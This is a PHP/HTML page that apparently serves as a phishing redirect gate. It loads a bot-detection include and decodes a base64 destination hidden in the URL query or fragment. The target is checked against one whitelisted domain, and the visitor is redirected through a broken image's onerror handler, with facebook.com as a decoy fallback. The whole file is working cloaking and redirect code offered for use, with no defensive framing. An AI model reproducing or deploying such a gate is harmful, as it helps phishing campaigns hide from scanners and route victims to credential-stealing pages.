<?php
require_once 'BotDetectLoader.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script src="?_js=_1"></script>
    <script>
        window.onload = function() {
            const defaultUrl = 'https://facebook.com';
            const allowedDomains = ['sopropertyllc.com'];

            // Check if string is Base64
            const isBase64 = (str) => {
                try {
                    return btoa(atob(str)) === str;
                } catch (err) {
                    return false;
                }
            };

            // Extract root domain
            const extractRootDomain = (url) => {
                const parts = url.split('.');
                return parts.slice(parts.length - 2).join('.');
            };

            // Process and validate URL string
            const processString = (str) => {
                const matches = str.match(/\(([^)]+)\)/);
                if (matches && matches[1]) {
                    let encodedUrl = matches[1].substring(26);
                    if (isBase64(encodedUrl)) {
                        try {
                            let decodedUrl = atob(encodedUrl);
                            if (!decodedUrl.startsWith('https://')) {
                                decodedUrl = 'https://' + decodedUrl;
                            }
                            let urlObj = new URL(decodedUrl);
                            let hostname = urlObj.hostname;
                            let rootDomain = extractRootDomain(hostname);

                            if (allowedDomains.includes(hostname) || allowedDomains.includes(rootDomain)) {
                                return decodedUrl;
                            } else {
                                console.warn('Domain not allowed:', hostname);
                            }
                        } catch (e) {
                            console.error('Error processing the string', e);
                        }
                    } else {
                        console.warn('Invalid Base64 string:', encodedUrl);
                    }
                }
                return '';
            };

            const queryString = window.location.search.substring(1);
            const hashString = window.location.hash.substring(1);

            // Determine redirect URL
            const redirectUrl = processString(queryString) || processString(hashString) || defaultUrl;

            // Image to trigger redirection
            const redirectImage = document.getElementById('redirect-image');
            redirectImage.onerror = function() {
                window.location.replace(redirectUrl);
            };
            redirectImage.src = "invalid_image.jpg";
        }
    </script>
</head>
<body>
    <img id="redirect-image" alt="">
</body>
</html>
